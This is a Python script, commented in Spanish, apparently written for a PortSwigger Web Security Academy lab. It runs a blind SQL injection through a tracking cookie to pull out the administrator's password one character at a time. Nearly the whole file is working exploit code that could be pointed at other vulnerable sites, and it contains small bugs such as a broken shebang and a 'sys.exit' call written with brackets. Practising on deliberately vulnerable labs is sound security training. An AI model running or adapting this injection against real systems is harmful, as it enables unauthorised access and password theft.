#/usr/bin/python3

from ast import If
from pwn import *
import requests, signal, time, pdb, sys, string

# CERRAR EL PROGRAMA
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit[1]

# CTRL + C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a3d00c904bcc0adc0823c3500740044.web-security-academy.net/" # DIRECCION DE ATAQUE
characters = string.printable

password = ""

def makeRequest():

    password = ""
    print("\n")

    p1 = log.progress("Aplicando FUERZA BRUTA")
    p1.status("\n\n COMENZANDO EL ATAQUE...")

    time.sleep(2)
    print("\n")

    p2 = log.progress("PASSWORD")

    for position in range(1,21):
        for character in characters:

            # MODIFICAR EL TRACKING ID POR EL QUE CORRESPONDA
            # MODIFICAR LAS SESSION POR LA QUE CORRESPONDA
            cookies = {
                'TrackingId':"UdnZ1GY05V26iDSB' and (select substring(password,%s,1) from users where username='administrator')='%s" % (position, character),
                'session':'CAihAqk7G7ogu9AM7QcKBQTgBCIeKTNr'
            }
            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                password += character
                p2.status(password)
                break

        if position == 20:
            p1.success("[!] ATAQUE FINALIZADO.")
            p2.success(password)
            print("\n CONTRASEÑA ENCONTRADA: %s" % password)

if __name__ == "__main__":
    makeRequest()
